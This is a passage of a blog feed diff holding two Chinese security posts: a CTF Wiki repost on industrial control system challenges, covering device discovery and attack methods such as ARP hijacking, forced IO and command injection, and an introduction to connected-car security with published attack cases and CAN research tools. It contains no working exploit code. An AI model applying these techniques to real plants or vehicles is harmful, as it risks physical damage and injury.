+<p>与业务场景高度契合，例如工业控制中，Web 端主要为显示当前使用场景中的控制参数、运行状态等信息，如果在内网中被中间人劫持，当 HMI 显示设备无法与 PLC 等实时运行设备同步时，系统会报警或出错。</p>
+</li>
+<li>
+<p>一般采用通用技术展示 Web 界面，以 windows 操作系统为主要平台，包括 WinCC、Windows Server、Windows 98/2000/XP 等看似古老的系统为主。</p>
+</li>
+<li>
+<p>Web 渗透的同时会保留多个端口，例如 FTP、HTTPS、Telnet、SNMP、NTP 等服务端口，在 Web 渗透无法打穿的同时可以试试其他端口。</p>
+</li>
+<li>
+<p>工控由于一般处于内网环境，内网劫持往往比较有效，但是如果内网配置了静态 IP 或其他防护措施，ARP 欺骗方式等内网劫持方法无法起效。</p>
+</li>
+<li>
+<p>敏感信息泄露，配置文件不完善是工控 Web 发布常见问题，不仅仅包括. git/.idea/.project 等工程信息协议，还可能出现路径遍历、命令注入、弱口令等问题。</p>
+</li>
+</ul>
+<h3 id="逆向分析reverse">逆向分析（Reverse）</h3>
+<p>该节主要讨论工控逆向的特点：</p>
+<ul>
+<li>
+<p>工控操作系统一般为 RTOS（Real Time Operate System）, 例如 vxworks、uc-os 等实时操作系统，在逆向前需要对其架构和指令集需要比较熟悉，如果不懂请自行学习。</p>
+</li>
+<li>
+<p>工控固件逆向常见的目标是工控工程加密算法、硬编码秘钥、硬编码后门等常见固件逆向漏洞，如果发现了堆栈溢出类漏洞，往往能够导致目标设备宕机（即 DOS 后果）。</p>
+</li>
+<li>
+<p>工控固件往往存在加密和压缩情况，需要在第一步解压过程对其进行解压或解密，这部分依据具体厂商来定，不能一概而论。</p>
+</li>
+<li>
+<p>工控固件存在逆向分析不出的情况</p>
+</li>
+</ul>
+<h3 id="工控协议protocol">工控协议（Protocol）</h3>
+<p>该节主要谈论工控协议类题目的相关特点：</p>
+<ul>
+<li>
+<p>工控协议针对工控场景设计，具有简单、高效、低延时等特点，所以针对此类的攻击完全可以考虑采用重放、命令注入等简单攻击手段。</p>
+</li>
+<li>
+<p>工控协议不仅仅采用公开协议、还包括众多的私有协议，这部分协议具体细节需要逆向或者采集数据来实现数据功能的还原。例如 Modbus、DNP3、Melsec-Q、S7、Ethernet/IP 等。</p>
+</li>
+<li>
+<p>工控协议可能导致目标 PLC、DCS、RTU 等设备出现宕机、不可重启等问题，采用基于 Fuzz 的方法可以快速高效发现 PLC 宕机类漏洞。</p>
+</li>
+<li>
+<p>工控协议中可能有众多针对 PLC 等设备的操作，用户需要区分哪些是合法请求、哪些是异常请求，这需要经验，需要研究推断当前流量的使用逻辑。这个场景很适合机器学习的条件，这可以考虑是个探索的方向。</p>
+</li>
+<li>
+<p>针对工控场景的实际防御方案其实最好的还是旁路检测，通过分光将流量接入分析系统，在不影响正常业务使用的同时对目标系统进行安全监控。</p>
+</li>
+</ul>
+<h3 id="工控编程program">工控编程（Program）</h3>
+<p>工控编程是工控系统运行的核心和重点，此类题目特点一般是：</p>
+<ul>
+<li>
+<p>工控编程核心为明白工控业务逻辑，而工控编程遵循 IEC61131-3（工控史上首例实现 PLC、DCS、运动控制、 SCADA 等联合编程的标准——IEC61131-3），包括 5 种编程语言标准，3 种是图形化语言（梯形图、顺序功能图和功能块图），两种是文本化语言（指令表和结构文本）。</p>
+</li>
+<li>
+<p>工控设备往往可以在线调试，从而可以控制某些输入输出端口，实现强制启停的功能，如果这些功能可以采用 Remote 方式重发，那攻击危害就更为严重。</p>
+</li>
+<li>
+<p>工控设备的连接方式多样，一般采用串口，但是目前设备发展支持以太网、USB 接口等新的方式，如果网口不行试试串口、USB。</p>
+</li>
+<li>
+<p>工控组态可以非常复杂，甚至连接成百上千个输入输出都有可能，组态中会由于添加了新的组件而更加麻烦，这时候要慢慢看，一点一点缕出来。</p>
+</li>
+</ul>
+<h2 id="工控设备发现">工控设备发现</h2>
+<p>工控设备发现是工控比赛的前提，目前针对工控设备扫描中，在 Nmap、Metasploit、Censes 集成了大量的工具，用于挖掘当前在线 PLC、DCS 等 ICS 设备。</p>
+<h3 id="工控扫描脚本">工控扫描脚本</h3>
+<h4 id="基于工控端口的nmap扫描脚本">基于工控端口的nmap扫描脚本</h4>
+<p>在大量 IP 中如何发现工控设备, 除了工控特殊端口意外，大量端口都是正常服务，例如 ftp、ssh、telnet、smtp、ntp 等正常网络服务。下面列表列举了当前可以利用开源工控扫描脚本。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564127358828.png" alt=""></p>
+<p>上述脚本并未完全整列了当前能够使用脚本信息，未完待续中......</p>
+<h4 id="基于工控组态软件的组件扫描">基于工控组态软件的组件扫描</h4>
+<p>各工控厂商往往自带组态软件，组态软件时连接当前内网内设备时可自主发现目标 PLC 设备</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>协议 / 设备</th>
+<th>连接方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>102(TCP)</td>
+<td>siemens s7</td>
+<td>西门子软件 Step7 自带扫描当前网段 PLC 设备功能</td>
+</tr>
+<tr>
+<td>502(TCP)</td>
+<td>modbus</td>
+<td>施耐德 SoMachine Basic 连接 PLC 设备自带扫描内网网段功能</td>
+</tr>
+</tbody>
+</table>
+<h3 id="工控扫描与发现引擎">工控扫描与发现引擎</h3>
+<h4 id="shodan-引擎">Shodan 引擎</h4>
+<p>Shodan 是一款网络空间搜索引擎，主要搜索的是存在于互联网中的设备，服务器、摄像头、工控设备、智能家居等，并且可以识别出其版本，位置，端口，服务等信息。Shodan 于 2013 年增加了针对工控协议的探测，用户可以直接使用工控协议的端口直接检索该协议的所有数据，用户也可以使用特征 Dork 直接搜索对应设备数据。</p>
+<h4 id="zoomeye-引擎">Zoomeye 引擎</h4>
+<p>ZoomEye 是知道创宇打造的面向网络空间的搜索引擎，ZoomEye 于 2015 年 3 月上线了工控专题 (ics.zoomeye.org)，ZoomEye 支持 12 种工控协议的数据检索，使用者也可以使用工控协议的端口和特征 Dork 关键字发现暴露在互联网的工控软硬件，对于工控协议类型的数据，ZoomEye 启用了保护策略，一般用户无法直接查看。</p>
+<h4 id="fofa-引擎">FOFA 引擎</h4>
+<p>FOFA 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等</p>
+<h4 id="diting-全网引擎">Diting 全网引擎</h4>
+<p>谛听 (ditecting) 网络空间工控设备搜索引擎，取谛听辨识万物之意，属意在搜寻暴露在互联网上的工业控制系统联网设备， 帮助安全厂家维护工控系统安全、循迹恶意企图人士。</p>
+<h4 id="censys-全网引擎">Censys 全网引擎</h4>
+<p>Censys 是一款搜索引擎，它允许计算机科学家了解组成互联网的设备和网络。Censys 由因特网范围扫描驱动，它使得研究人员能够找到特定的主机，并能够针将设备、网站和证书的配置和部署信息创建到一个总体报告中。</p>
+<p>各类漏洞引擎内容不同，采取配置、部署节点等存在较大的差异，目前针对工控这块的搜索引擎以 shodan 和 ditecting 更为专业，但是从针对端口来看，各个引擎宣称的公布检索方式不尽相同。</p>
+<h2 id="工控漏洞利用">工控漏洞利用</h2>
+<h3 id="组态利用">组态利用</h3>
+<p>组态是工控场景的核心，是工控编程与实现功能的核心内容，如果你不太懂组态，请自行学习自动化领域工业控制系统组态的相关书籍。 最好的学习方式是拿到相关的产品说明书，针对说明书上的内容一点一点学习。</p>
+<h4 id="组态的利用方法">组态的利用方法</h4>
+<ul>
+<li>强制 IO(最管用的一种调试方法)</li>
+<li>工程加密与解密（工程加密是 PLC 一种保护措施，但仍存在被破解的可能）</li>
+<li>上载下载（基础概念请自行恶补）</li>
+<li>PLC 等目标设备的内存分布（基础概念请自行恶补）</li>
+<li>其他附加功能（例如 ftp、ntp 等）</li>
+</ul>
+<h3 id="通信劫持">通信劫持</h3>
+<p>通信劫持是工控场景中最经典利用方式，例如 ARP 劫持、PLC/HMI 通信劫持、PLC 会话劫持、PLC 命令执行等内容。</p>
+<h4 id="通信劫持的方法">通信劫持的方法</h4>
+<ul>
+<li>ARP 劫持，ARP 劫持可以阻断 PLC 与其他设备的通信，鉴于工程会存在写死 IP 等交互地址，未必管用，但是值得一试</li>
+<li>PLC/HMI 通信劫持，采用旁路设备接入或控制 PLC 设备，对 IO 进行强制重写或输出</li>
+<li>PLC 命令执行，针对工控设备最敏感的部分是设备宕机（无法恢复的）、设备启停、设备强制更新参数，等等这些对普通工艺能够产生较大的影响。</li>
+</ul>
+<h3 id="web-渗透">Web 渗透</h3>
+<p>目标企业往往存在 Web 类工控应用，例如发布工艺发布页面，用户数据库等页面，这些内容基本与平日 Web 题目无异。</p>
+<h4 id="web渗透的常用方法">Web渗透的常用方法</h4>
+<ul>
+<li>弱口令（工控里比较常见，工控设备中厂商默认密码）</li>
+<li>命令注入（比较普遍，需要审计 Web 工程源码）</li>
+<li>目录遍历（手测简单，利用难，需要结合上传等功能实现）</li>
+<li>预置后门（比较难以发现，需要逆向和 Web 渗透相结合）</li>
+<li>SQL 类注入（比较简单）</li>
+<li>XSS 在这里基本无用（基本没怎么遇到过）</li>
+<li>工程文件泄露（.git/.idea/.project 等工程文件泄露）</li>
+</ul>
+<p>转自：https://ctf-wiki.github.io/ctf-wiki/ics/</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[智能汽车安全研究：风险点、破解案例、研究工具]]></title>
+        <id>https://hi-kk.github.io//post/zhi-neng-qi-che-an-quan-yan-jiu-feng-xian-dian-po-jie-an-li-yan-jiu-gong-ju</id>
+        <link href="https://hi-kk.github.io//post/zhi-neng-qi-che-an-quan-yan-jiu-feng-xian-dian-po-jie-an-li-yan-jiu-gong-ju">
+        </link>
+        <updated>2018-11-01T07:08:27.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>很幸运公司采购了一台荣威智能网联汽车给我们作研究（壕）<br>
+之前对关于网联汽车的安全研究只是道听途说，看着各种大佬对汽车一顿操作，实际上自己也没这条件去做这方面研究，所以现在既然有了这么宝贵的机会，就好好把握<br>
+于是就各种Google搜罗相关资料，这里就分享下自己对搜集到各种资料进行的一个入门性总结，希望能够帮助其他跟我一样刚接触、准备研究汽车安全的朋友对这块知识体系做一个大概了解。<br>
+这篇文章主要内容是智能网联汽车的风险点分析、已有的汽车破解案例以及入门汽车安全研究的一些工具</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>很幸运公司采购了一台荣威智能网联汽车给我们作研究（壕）<br>
+之前对关于网联汽车的安全研究只是道听途说，看着各种大佬对汽车一顿操作，实际上自己也没这条件去做这方面研究，所以现在既然有了这么宝贵的机会，就好好把握<br>
+于是就各种Google搜罗相关资料，这里就分享下自己对搜集到各种资料进行的一个入门性总结，希望能够帮助其他跟我一样刚接触、准备研究汽车安全的朋友对这块知识体系做一个大概了解。<br>
+这篇文章主要内容是智能网联汽车的风险点分析、已有的汽车破解案例以及入门汽车安全研究的一些工具</p>
+<!-- more -->
+<h1 id="智能网联汽车信息安全风险">智能网联汽车信息安全风险</h1>
+<p>智能网联汽车从架构上可分为四个不同的功能区，分别是基本控制功能区，如传感单元、底盘系统等；扩展功能区，如远程信息处理、信息娱乐管理、车体系统等；外部接口，譬如LTE-V、蓝牙、WIFI等；以及手机、存储器、各种诊断仪表、云服务等外部功能区。</p>
+<p>每个功能区对于安全的定义和需求都不相同，需要定义合理规范的系统架构，将不同功能区进行隔离，并对不同区域间的信息流转进行严格的控制，包括接入身份认证和数据加密，来保证信息安全传输，从而达到智能驾驶功能的高可用性、便利性和保护用户信息隐私的目的。</p>
+<p>根据分析研究，智能网联汽车系统面临的攻击主要来自两方面——内部攻击和远程攻击。其中，内部攻击主要由智能网联自身缺陷引起，比如总线、网关、ECU等安全程度不够所导致。未来智能网联汽车面临的信息安全威胁梳理为来自云端、通道、终端三个维度。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129333430.png" alt=""></p>
+<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
+<h2 id="一终端层安全风险">（一）终端层安全风险</h2>
+<h3 id="1-t-box-安全风险">1、T-BOX 安全风险</h3>
+<p>T-BOX（Telematics BOX）的网络安全系数决定了汽车行驶和整个智能交通网络的安全，是车联网发展的核心技术之一，恶意攻击者通过分析固件内部代码能够轻易获取加密方法和密钥，可实现对消息会话内容的破解。</p>
+<h3 id="2-ivi-安全风险">2、IVI 安全风险</h3>
+<p>车载信息娱乐系统（In-Vehicle Infotainment，IVI）的高集成度使其所有接口都可能成为黑客的攻击节点，因此IVI的被攻击面将比其他任何车辆部件都多。</p>
+<h3 id="3-终端升级安全风险">3、终端升级安全风险</h3>
+<p>智能网联汽车如不及时升级更新，就会由于潜在安全漏洞而遭受各方面（如 4G、 USB、 SD 卡、 OBD 等渠道）的恶意攻击，导致车主个人隐私泄露、车载软件及数据被窃取或车辆控制系统遭受恶意攻击等安全问题。</p>
+<h3 id="4-车载-os-安全风险">4、车载 OS 安全风险</h3>
+<p>车载电脑系统常采用嵌入式 Linux、 QNX、 Android等作为操作系统，其代码庞大且存在不同程度的安全漏洞，且车联网应用系统复杂多样，某一种特定的安全技术不能完全解决应用系统的所有安全问题。而智能终端还存在被入侵、控制的风险。</p>
+<h3 id="5-移动app安全风险">5、移动App安全风险</h3>
+<p>对于没有进行保护的App进行逆向分析挖掘，可直接看到 TSP（远程服务提供商）的接口、参数等信息。</p>
+<h2 id="二传输通道安全风险">（二）传输通道安全风险</h2>
+<h3 id="1-车载诊断系统接口">1、车载诊断系统接口</h3>
+<p>基于车载诊断系统接口(OBD)的攻击现在的智能网联汽车内部都会有十几个到几十个不等的 ECU，不同 ECU 控制不同的模块。OBD 接口作为总线上的一个节点，不仅能监听总线上面的消息，而且还能伪造消息（如传感器消息）来欺骗 ECU，从而达到改变汽车行为状态的目的。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129353735.png" alt=""></p>
+<h3 id="2-车内无线传感器安全风险">2、车内无线传感器安全风险</h3>
+<p>传感器存在通讯信息被窃听、被中断、被注入等潜在威胁，甚至通过干扰传感器通信设备还会造成无人驾驶汽车偏行、紧急停车等危险动作。</p>
+<h3 id="3-车内网络传输安全风险">3、车内网络传输安全风险</h3>
+<p>汽车内部相对封闭的网络环境看似安全，但其中存在很多可被攻击的安全缺口，如胎压监测系统、 Wi-Fi、蓝牙等短距离通信设备等。</p>
+<h3 id="4-车载终端架构安全风险">4、车载终端架构安全风险</h3>
+<p>现在每辆智能网联汽车基本上都装有五六十个 ECU 来实现移动互联的不同功能，进入智能网联汽车时代后， 其接收的数据不仅包含从云端下载的内容，还有可能接收到那些通过网络连接端口植入的恶意软件，因此大大增加了智能网联汽车被“黑”的风险。</p>
+<h3 id="5-网络传输安全风险">5、网络传输安全风险</h3>
+<p>“车-X”（人、车、路、互联网等）通过 Wi-Fi、移动通信网(2.5G/3G/4G等)、DSRC等无线通信手段与其它车辆、交通专网、互联网等进行连接。网络传输安全威胁指车联网终端与网络中心的双向数据传输安全威胁。</p>
+<h2 id="三-云平台安全威胁">（三） 云平台安全威胁</h2>
+<p>目前大部分车联网数据使用分布式技术进行存储，主要面临的安全威胁包括黑客对数据恶意窃取和篡改、敏感数据被非法访问。<br>
+<img src="https://hi-kk.github.io//post-images/1564130095864.png" alt=""></p>
+<h1 id="汽车安全研究案例">汽车安全研究案例</h1>
+<h2 id="1-tcu-攻击案例">1. TCU 攻击案例</h2>
+<p>对 TBOX 的检测简单方式是找到集成电路板上 eSIM 卡， 使用漆包线将TBOX和手机以飞线的方式连接然后手机开启热点 把TBOX的网络共享出来，研究人员就可以通过手机共享的热点 连接到TBOX的内网探索车辆内部通讯网络。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129388927.png" alt=""></p>
+<p>检测TBOX的集成电路板，查找供应商预留的调试接口或者 隐藏的特殊功能的针脚并以飞线的方式使电脑与TBOX集成电路板相连接，使用串口调试工具对其调试输出打印日志，可以得到 一些敏感信息如APN名称、物联网卡号、ICCID、私网服务器IP 地址和本地监听端口等信息，为后续的深入研究打下基础。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129403932.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
+<h2 id="2-安全气囊攻击案例">2. 安全气囊攻击案例</h2>
+<p><strong>攻击条件：</strong></p>
+<ul>
+<li>
+<ol>
+<li>车辆点火且车辆的速度必须小于6公里/小时。</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>通过获得CAN总线访问权限以及OBD接口向车内网络发 送恶意构造的UDS对安全气囊进行攻击。</li>
+</ol>
+</li>
+</ul>
+<p><strong>漏洞影响：</strong> 可对车内乘客造成物理伤害，该漏洞影响到2014年起生产的 乘用车。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129416013.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="3-斯巴鲁遥控钥匙系统攻击案例">3. 斯巴鲁遥控钥匙系统攻击案例</h2>
+<p>某些型号的斯巴鲁汽车所采用的钥匙系统在对车辆进行上锁、解锁或其他操作时，使用的是序列码。</p>
+<p>这种序列码也被称作是滚动代码或跳跃代码，为了避免攻击者发现车辆的序列码并使用这种设计缺陷来劫持汽车，这种序列码应该是随机的才对。</p>
+<p>通过接收钥匙系统所发送出的一个数据包（例如，用户在按下钥匙系统的任何一个按键之后，攻击者只需要在信号范围内 就可以捕捉到数据包），攻击者将能够利用该数据包来推测出该车辆钥匙系统下一次生成的滚动代码，接下来他就可以使用这个预测码或者直接重放来上锁或解锁车辆。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129430911.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="4-斯巴鲁车载娱乐系统攻击案例">4. 斯巴鲁车载娱乐系统攻击案例</h2>
+<p>Guzman 发现斯巴鲁的移动应用程序使用随机生成的认证令牌，以便在有用户认证后允许访问，通常来说客户端与服务端采用这样的认证方式是很正常的，根据良好的 Web 应用安全实践，令牌应在短时间内过期或失效，以防止重用。然而问题是，Starlink 允许用户利用令牌永久登录斯巴鲁，也就是说令牌一旦生成，永远不会失效。据 Guzman 透露，令牌通过一个 URL 发送，并且被存放在未被加密的数据库中。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129458116.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129473954.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="5-马自达车机娱乐系统破解案例">5. 马自达车机娱乐系统破解案例</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129491831.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129511314.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="6-特斯拉汽车车联网系统攻击案例分析">6. 特斯拉汽车车联网系统攻击案例分析</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129525905.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129541622.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129551215.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129566500.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129578107.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129589225.png" alt=""></p>
+<p>详见：《Zeronights 2016-特斯拉车载网关的安全研究Gateway_Internals_of_Tesla_Motors_v6》.pdf</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129598580.png" alt=""></p>
+<p>​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="7-语音控制系统破解案例">7. 语音控制系统破解案例</h2>
+<p>“海豚音”的攻击原理是将语音命令频率转换成为超声波频率信号，“海豚音”的攻击原理是将语音命令声音调制后加载到载波的超声波上，因为超出人耳接收频率的范围，无法被人听见，却可以被手机、智能家居以及智能汽车等智能设备的语音控制系统接收到。</p>
+<p>由于麦克风的非线性特性，会将原本被调制的语音命令声音解调、恢复到调制之前的状态，之后滤波器会过滤掉人耳不可听到的部分，这样语音指令可以消无声息的被语音识别系统识别到，最终实现攻击。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129612012.png" alt=""><br>
+​													——《2017智能网联汽车信息安全年度报告》</p>
+<h2 id="8-车辆gps轨迹窃取案例">8. 车辆GPS轨迹窃取案例</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129624506.png" alt=""></p>
+<h2 id="9-主动刹车系统攻击案例">9. 主动刹车系统攻击案例</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129640756.png" alt=""></p>
+<p>​													——《智能网联汽车信息安全白皮书（2016）》</p>
+<h1 id="汽车研究硬件设备">汽车研究硬件设备</h1>
+<h2 id="canable2960">CANable——$29/$60</h2>
+<p>官网：https://canable.io/</p>
+<p>CANable是一个小型低成本的开放源码USB到CAN适配器。CANable显示为计算机上的虚拟串行端口，充当到CAN总线接口的串行线。使用备选的candleLight固件，CANable枚举为Linux上的本地CAN接口。原有CANable目前缺货，但很快就可以在Protofusion商店https://store.protofusion.org/和Tindie上买到！</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129655710.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129668398.png" alt=""></p>
+<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
+<h2 id="obdlink49">OBDLink——$49+</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129680348.jpg" alt=""></p>
+<p>一款易于使用，价格低廉，防黑客，轻便快捷的蓝牙OBD适配器。可将您的智能手机，平板电脑，笔记本电脑或电脑转变为精密的诊断扫描工具，行程计算机和实时性能监视器。</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129690307.png" alt=""></p>
+<p>官网：http://www.obdlink.com/</p>
+<h1 id="hackrf1000">HackRF——￥1000+</h1>
+<p><img src="https://hi-kk.github.io//post-images/1564129706212.jpg" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1564129717950.png" alt=""></p>
+<p>https://item.taobao.com/item.htm?spm=a1z10.1-c.w4004-13257850194.10.77953d88aiMmMA&amp;id=526187854860</p>
+<h2 id="广成科技产品线">广成科技产品线</h2>
+<p><img src="https://hi-kk.github.io//post-images/1564129733448.png" alt=""></p>
+<p>淘宝店铺：https://shop72369840.taobao.com/</p>
+<p>官网：http://www.gcgd.net/</p>
+<h2 id="icsim">ICSim</h2>
+<p>http://opengarages.org/</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129751620.png" alt=""></p>
+<p>git clone https://github.com/zombieCraig/ICSim.git</p>
+<p>详见：《Car Hacking CAE Tech Talk》.pdf</p>
+<h2 id="scantool-free-open-source">ScanTool (free, open-source)</h2>
+<p>sudo apt-get install scantool</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129764625.png" alt=""></p>
+<p>详见：《Car Hacking CAE Tech Talk》.pdf</p>
+<h2 id="cantoolz">CANToolz</h2>
+<p>https://github.com/CANToolz/CANToolz</p>
+<p>CANToolz是一个分析CAN网络和设备的框架。它提供了多个模块，可以使用CANToolz的<code>pipe</code>系统由安全研究人员、汽车/OEM安全测试人员在黑箱分析中使用.</p>
+<p>CANToolz可用于ECU的发现，MITM的测试，模糊，畜力，扫描或研发，测试和验证.更多的可以很容易地用一个新的模块来实现。</p>
+<h3 id="this-framework-can-be-used-as">This framework can be used as:</h3>
+<ul>
+<li>Automated tests framework (on CAN bus)</li>
+<li>CAN ECU/tests prototyping</li>
+<li>Blackbox analysis of CAN traffic</li>
+<li>Traffic replay</li>
+<li>MITM</li>
+<li>Fuzzing</li>
+<li>UDS scanning</li>
+</ul>
+<p><img src="https://hi-kk.github.io//post-images/1564129777386.png" alt=""><br>
+详见：《Blackhat2016-eu-16-Sintsov-Pen-Testing-Vehicles-With-Cantoolz》.pdf</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129793503.png" alt=""></p>
+<p>​									——《2014_car_hackers_handbook_compressed》.pdf</p>
+<p><img src="https://hi-kk.github.io//post-images/1564129811175.png" alt=""></p>
+<p>​						——《Car-Wars-Episode-I-Hacker-Menace-Matt-Carpenter》.pdf</p>
+<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
 ]]></content>
     </entry>
 </feed>
